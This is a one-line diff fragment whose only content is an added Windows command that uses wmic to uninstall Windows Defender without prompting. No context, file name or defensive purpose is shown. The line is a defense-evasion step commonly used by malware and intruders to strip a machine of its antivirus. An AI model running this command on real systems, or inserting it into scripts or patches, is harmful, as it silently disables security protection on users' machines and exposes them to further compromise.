@@ -1,0 +1,1 @@
+wmic product where name="Windows Defender" call uninstall -nointeractive
